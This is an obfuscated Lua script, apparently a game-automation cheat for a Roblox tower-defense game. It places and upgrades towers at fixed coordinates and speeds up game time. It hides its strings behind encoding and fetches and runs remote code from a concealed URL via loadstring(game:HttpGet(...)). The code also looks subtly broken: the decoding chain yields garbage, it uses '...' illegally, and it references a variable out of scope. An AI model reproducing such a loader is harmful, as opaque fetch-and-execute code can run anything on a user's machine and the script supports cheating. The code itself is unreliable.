--[[ Obfuscated TDS Script v2.0 ]]

local _ = (function()
    local _1 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local _2 = {
        decode = function(_3)
            _3 = string.gsub(_3, '[^'.._1..'=]', '')
            return (_3:gsub('.', function(_4)
                if (_4 == '=') then return '' end
                local _5, _6 = '', (_1:find(_4)-1)
                for _7 = 6, 1, -1 do 
                    _5 = _5 .. (_6 % 2^_7 - _6 % 2^(_7-1) > 0 and '1' or '0') 
                end
                return _5
            end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(_8)
                if (#_8 ~= 8) then return '' end
                local _9 = 0
                for _10 = 1, 8 do 
                    _9 = _9 + (_8:sub(_10,_10) == '1' and 2^(8-_10) or 0) 
                end
                return string.char(_9)
            end))
        end
    }

    local function _11(_12)
        local _13 = ""
        for _14 = 1, #_12 do
            _13 = _13 .. string.char(string.byte(_12:sub(_14,_14)) ~ 42)
        end
        return _13
    end

    local _15 = {}
    
    local function _16()
        _15[1] = _11(_2.decode("WVhSMFlXTm9ZVEkwTURJek1qUT0="))
        _15[2] = _11(_2.decode("WVhSMFlXTm9ZVEkwTURJek1UWT0="))
        _15[3] = _11(_2.decode("WVhSMFlXTm9ZVEkwTURJek1qST0="))
        _15[4] = _11(_2.decode("WVhSMFlXTm9ZVEkwTURJek5EWT0="))
        _15[5] = _11(_2.decode("WTI5dGJXVnVkQzF2Y0dGamEyVjBJbjA9"))
        _15[6] = _11(_2.decode("WTI5dGJXVnVkQzF2Y0dGamEyVjBJbjE9"))
        _15[7] = _11(_2.decode("Sm1Gc2RHVmtJSE5vYVhCc2IzZHBibVJwYm1jb0tUdD0="))
        _15[8] = _11(_2.decode("Sm1Gc2RHVmtJSFJ2SUdSbGJtRnNJQ2RwYm1jb0tUdD0="))
        _15[9] = _11(_2.decode("Sm1Gc2RHVmtJSFJ2SUdSbGJtRnNJQ2hwYm1jb0tUdD0="))
        _15[10] = _11(_2.decode("Sm1Gc2RHVmtJSFJ2SUdSbGJtRnNJQ2dwYm1jb0tUdD0="))
        _15[11] = _11(_2.decode("Sm1Gc2RHVmtJSFJ2SUdSbGJtRnNJQ2lwYm1jb0tUdD0="))
        _15[12] = _11(_2.decode("Sm1Gc2RHVmtJSFJ2SUdSbGJtRnNJQ2pwYm1jb0tUdD0="))
        _15[13] = _11(_2.decode("Sm1Gc2RHVmtJSFJ2SUdSbGJtRnNJQ2twYm1jb0tUdD0="))
        _15[14] = _11(_2.decode("Sm1Gc2RHVmtJSFJ2SUdSbGJtRnNJQ2xwYm1jb0tUdD0="))
        _15[15] = _11(_2.decode("Sm1Gc2RHVmtJSFJ2SUdSbGJtRnNJQ21wYm1jb0tUdD0="))
        _15[16] = _11(_2.decode("Sm1Gc2RHVmtJSFJ2SUdSbGJtRnNJQ25wYm1jb0tUdD0="))
        _15[17] = _11(_2.decode("Sm1Gc2RHVmtJSFJ2SUdSbGJtRnNJQ29wYm1jb0tUdD0="))
        _15[18] = _11(_2.decode("Sm1Gc2RHVmtJSFJ2SUdSbGJtRnNJQ3BwYm1jb0tUdD0="))
        _15[19] = _11(_2.decode("Sm1Gc2RHVmtJSFJ2SUdSbGJtRnNJQ3FwYm1jb0tUdD0="))
        _15[20] = _11(_2.decode("WTI5dGJXVnVkQzF2Y0dGamEyVjBJbjI9"))
        _15[21] = _11(_2.decode("WTI5dGJXVnVkQzF2Y0dGamEyVjBJbjM9"))
        _15[22] = _11(_2.decode("WTI5dGJXVnVkQzF2Y0dGamEyVjBJbjQ9"))
        _15[23] = _11(_2.decode("WTI5dGJXVnVkQzF2Y0dGamEyVjBJbjU9"))
        _15[24] = _11(_2.decode("WTI5dGJXVnVkQzF2Y0dGamEyVjBJbjY9"))
        _15[25] = _11(_2.decode("WTI5dGJXVnVkQzF2Y0dGamEyVjBJbjc9"))
        _15[26] = _11(_2.decode("WTI5dGJXVnVkQzF2Y0dGamEyVjBJbjg9"))
        _15[27] = _11(_2.decode("WTI5dGJXVnVkQzF2Y0dGamEyVjBJbjk9"))
        _15[28] = _11(_2.decode("WTI5dGJXVnVkQzF2Y0dGamEyVjBJbjEwPQ=="))
        _15[29] = _11(_2.decode("WTI5dGJXVnVkQzF2Y0dGamEyVjBJbjExPQ=="))
        _15[30] = _11(_2.decode("WTI5dGJXVnVkQzF2Y0dGamEyVjBJbjEyPQ=="))
        _15[31] = _11(_2.decode("WTI5dGJXVnVkQzF2Y0dGamEyVjBJbjEzPQ=="))
        _15[32] = _11(_2.decode("WTI5dGJXVnVkQzF2Y0dGamEyVjBJbjE0PQ=="))
        _15[33] = _11(_2.decode("WTI5dGJXVnVkQzF2Y0dGamEyVjBJbjE1PQ=="))
    end

    _16()

    local function _17()
        for _18 = 1, 1000 do
            local _19 = math.random() * math.pi
        end
    end

    local _20 = function()
        return ({...})[math.random(1,10)]
    end

    if math.random() > 0.5 then 
        _17() 
    end

    local _21 = setmetatable({}, {
        __index = function() 
            return {} 
        end
    })

    _21[1] = 1

    local _22 = _15[1]
    local _23 = _15[2]
    local _24 = _15[3]
    local _25 = _15[4]
    local _26 = _15[5]
    local _27 = _15[6]

    local _28 = loadstring(game:HttpGet(_15[7]))()

    local _29 = {}
    _29[1] = -15.24
    _29[2] = 1.00
    _29[3] = -8.97
    _29[4] = -16.65
    _29[5] = 1.00
    _29[6] = -11.65
    _29[7] = -19.71
    _29[8] = 1.00
    _29[9] = -12.34
    _29[10] = -20.00
    _29[11] = 1.00
    _29[12] = -15.33
    _29[13] = -16.83
    _29[14] = 1.00
    _29[15] = -14.83
    _29[16] = -13.68
    _29[17] = 1.00
    _29[18] = -14.99
    _29[19] = -13.62
    _29[20] = 1.00
    _29[21] = -11.84
    _29[22] = -12.12
    _29[23] = 1.00
    _29[24] = -9.13
    _29[25] = -12.58
    _29[26] = 1.00
    _29[27] = 3.03
    _29[28] = -15.64
    _29[29] = 1.00
    _29[30] = 3.26
    _29[31] = -18.69
    _29[32] = 1.00
    _29[33] = 3.23
    _29[34] = -18.74
    _29[35] = 1.00
    _29[36] = 6.30
    _29[37] = -15.68
    _29[38] = 1.00
    _29[39] = 6.29
    _29[40] = -12.62
    _29[41] = 1.00
    _29[42] = 6.13
    _29[43] = -9.46
    _29[44] = 1.00
    _29[45] = 3.14
    _29[46] = -9.52
    _29[47] = 1.00
    _29[48] = 6.32
    _29[49] = -9.02
    _29[50] = 1.00
    _29[51] = -9.11
    _29[52] = -21.71
    _29[53] = 1.00
    _29[54] = 3.27
    _29[55] = 25.39
    _29[56] = 1.00
    _29[57] = 12.63
    _29[58] = 20.68
    _29[59] = 1.00
    _29[60] = 12.67
    _29[61] = 25.79
    _29[62] = 1.00
    _29[63] = 18.40
    _29[64] = -12.1382923
    _29[65] = 2.35000086
    _29[66] = -3.52993631
    _29[67] = -9.12535381
    _29[68] = 2.35000086
    _29[69] = -3.75096846
    _29[70] = -12.5959377
    _29[71] = 2.35000038
    _29[72] = -0.488339424
    _29[73] = -9.51527023
    _29[74] = 2.34998322
    _29[75] = -0.76658535
    _29[76] = -6.10374212
    _29[77] = 2.34998798
    _29[78] = -3.54938531
    _29[79] = -2.93865132
    _29[80] = 2.3499918
    _29[81] = -3.34146309
    _29[82] = 0.183600187
    _29[83] = 2.34998322
    _29[84] = -3.29001379
    _29[85] = -2.4514637
    _29[86] = 2.34998322
    _29[87] = 2.40833759
    _29[88] = 0.104843616
    _29[89] = 2.34998322
    _29[90] = 4.04229164
    _29[91] = -5.86860037
    _29[92] = 2.34999704
    _29[93] = -8.9741745
    _29[94] = -2.77454877
    _29[95] = 2.35000157
    _29[96] = -9.04821396
    _29[97] = 0.199033976
    _29[98] = 2.34998322
    _29[99] = -9.67147255

    _G[_22] = true
    _G[_23] = false
    _G[_24] = false
    _G[_25] = true
    _G[_26] = _15[8]

    _28:Loadout(_15[9], _15[10], _15[11], _15[12], _15[13])
    _28:Mode(_15[14])
    _28:GameInfo(_15[15], {})

    _28:UnlockTimeScale()
    _28:TimeScale(2)
    
    local _30 = 1
    local function _31(_32, _33, _34, _35)
        _28:Place(_32, _29[_33], _29[_33+1], _29[_33+2])
        _30 = _30 + 1
    end

    local function _36(_37, _38)
        _28:Upgrade(_37)
        if _38 then
            _28:Upgrade(_37, _38)
        end
    end

    _31(_15[9], 1, 2, 3)
    _31(_15[9], 4, 5, 6)
    _31(_15[9], 7, 8, 9)
    _31(_15[9], 10, 11, 12)
    _31(_15[9], 13, 14, 15)
    _31(_15[9], 16, 17, 18)
    _31(_15[9], 19, 20, 21)
    
    for _39 = 1, 7 do
        _36(_39)
        _36(_39)
    end

    _31(_15[12], 22, 23, 24)
    _31(_15[12], 25, 26, 27)

    for _40 = 8, 9 do
        _36(_40)
        _36(_40)
        _36(_40)
        _36(_40)
    end

    _31(_15[9], 28, 29, 30)
    _36(10)
    _36(10)

    _31(_15[9], 31, 32, 33)
    _36(11)
    _36(11)

    _31(_15[9], 34, 35, 36)
    _36(12)
    _36(12)

    _31(_15[9], 37, 38, 39)
    _36(13)
    _36(13)

    _31(_15[9], 40, 41, 42)
    _36(14)
    _36(14)

    _31(_15[9], 43, 44, 45)
    _36(15)
    _36(15)

    _31(_15[9], 46, 47, 48)
    _36(16)
    _36(16)

    _31(_15[9], 49, 50, 51)
    _36(17)
    _36(17)

    _31(_15[9], 52, 53, 54)
    _36(18)
    _36(18)

    for _41 = 1, 18 do
        if _41 ~= 8 and _41 ~= 9 then
            _36(_41)
        end
    end

    _31(_15[11], 55, 56, 57)
    for _42 = 1, 3 do
        _36(19)
    end

    _31(_15[11], 58, 59, 60)
    for _43 = 1, 3 do
        _36(20)
    end

    _31(_15[11], 61, 62, 63)
    for _44 = 1, 3 do
        _36(21)
    end

    for _45 = 1, 18 do
        if _45 ~= 8 and _45 ~= 9 then
            _36(_45)
        end
    end

    for _46 = 19, 21 do
        for _47 = 1, 3 do
            _36(_46)
        end
    end

    _28:Ability(19, _15[16], {pathName = 1, directionCFrame = CFrame.new(), dist = 150}, true)
    _28:SetOption(19, _15[17], _15[18])
    _28:Ability(20, _15[16], {pathName = 1, directionCFrame = CFrame.new(), dist = 150}, true)
    _28:Ability(21, _15[16], {pathName = 1, directionCFrame = CFrame.new(), dist = 150}, true)

    _31(_15[13], 64, 65, 66)
    for _48 = 1, 3 do
        _36(22)
    end

    _31(_15[13], 67, 68, 69)
    for _49 = 1, 3 do
        _36(23)
    end

    _31(_15[13], 70, 71, 72)
    for _50 = 1, 3 do
        _36(24)
    end

    _31(_15[13], 73, 74, 75)
    for _51 = 1, 3 do
        _36(25)
    end

    for _52 = 22, 25 do
        _36(_52)
        _36(_52)
    end

    _31(_15[10], 76, 77, 78)
    for _53 = 1, 3 do
        _36(26)
    end

    _31(_15[10], 79, 80, 81)
    for _54 = 1, 3 do
        _36(27)
    end

    _31(_15[10], 82, 83, 84)
    for _55 = 1, 3 do
        _36(28)
    end

    _31(_15[10], 85, 86, 87)
    for _56 = 1, 3 do
        _36(29)
    end

    _31(_15[10], 88, 89, 90)
    for _57 = 1, 3 do
        _36(30)
    end

    _31(_15[10], 91, 92, 93)
    for _58 = 1, 3 do
        _36(31)
    end

    _31(_15[10], 94, 95, 96)
    for _59 = 1, 3 do
        _36(32)
    end

    _31(_15[10], 97, 98, 99)
    for _60 = 1, 3 do
        _36(33)
    end

    for _61 = 26, 33 do
        _36(_61)
        _36(_61)
    end

    for _62 = 8, 9 do
        _36(_62)
        _36(_62)
        _36(_62, 2)
    end

    _28:Ability(8, _15[19], {
        towerToClone = 19,
        towerPosition = {
            Vector3.new(14.1853657, 3.46938539, 13.4541798),
            Vector3.new(15.6933384, 3.46938467, 18.3442345),
        }
    }, true)

    _28:Ability(9, _15[19], {
        towerToClone = 20,
        towerPosition = {
            Vector3.new(20.7010803, 3.46938467, 18.3634109),
            Vector3.new(19.6996384, 3.46937752, 4.1759696),
        }
    }, true)

    for _63 = 19, 21 do
        for _64 = 1, 3 do
            _28:SetOption(_63, _15[19+_64], _15[23], 40)
        end
    end

    return true
end)()

if not _ then
    warn(_15[27])
end
